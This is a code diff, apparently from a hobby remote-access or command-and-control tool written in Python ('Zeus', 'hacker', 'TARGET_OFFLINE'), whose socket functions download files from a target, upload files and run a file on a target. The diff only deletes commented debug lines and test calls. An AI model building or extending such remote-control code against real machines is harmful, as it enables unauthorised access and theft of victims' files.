@@ -209,12 +209,9 @@ def get_files(id, dir): # get byte size
         return data
     
 
-
-#get_files(2, 'E:\\Workspace\\Code\\Tutorials\\Sockets\\Zeus')
-
 def download_file(id, dir, loc):
     if loc == 'None':
-        loc = DOWNLOAD_LOC # change later with respect to hacker
+        loc = DOWNLOAD_LOC
 
     filename = os.path.basename(dir)
 
@@ -233,7 +230,6 @@ def download_file(id, dir, loc):
     confirm = s.recv(47).decode('utf-8')
 
     if confirm == 'TARGET_OFFLINE':
-        #print('[COMMAND] Requested target is offline.')
         return False
     
     s.send(bytes(dir, 'utf-8'))
@@ -241,24 +237,16 @@ def download_file(id, dir, loc):
     confirm = s.recv(100).decode('utf-8')
 
     if confirm == 'INVALID':
-        #print('[LOG] File doesnt exist')
         return 'None'
-    
-    #print('[COMMAND] Downloading file...')
-
     
     f = open(f'{loc}\\{filename}', 'wb')
     
-
     file_size = s.recv(1024).decode('utf-8')
     
     data = s.recv(int(file_size))
     
     f.write(data)
     f.close()
-
-#download_file(2, 'C:\\Users\\shash\\Videos\\Captures\\1.mp4', 'None')
-
 
 
 def upload(id, file_path, download_path):
@@ -336,7 +324,6 @@ def run(id, file):
     confirm = s.recv(47).decode('utf-8')
 
     if confirm == 'TARGET_OFFLINE':
-        #print('[COMMAND] Requested target is offline.')
         return False
     
     s.send(bytes(file, 'utf-8'))
